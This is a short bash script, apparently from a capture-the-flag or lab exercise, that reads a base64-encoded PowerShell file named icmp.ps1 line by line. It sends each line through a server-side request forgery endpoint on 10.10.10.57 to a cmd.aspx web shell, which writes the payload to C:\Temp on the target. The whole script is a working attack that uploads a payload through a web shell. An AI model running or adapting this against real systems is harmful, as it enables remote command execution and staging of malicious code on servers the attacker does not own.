#!/bin/bash
export IFS=$'\n'
for line in $(cat icmp.ps1.b64); do
	lines="echo ${line} >> C:\Temp\icmp.ps1.b64" 
	curl -v -G -X GET 'http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx' --data-urlencode "xcmd=$lines"
done
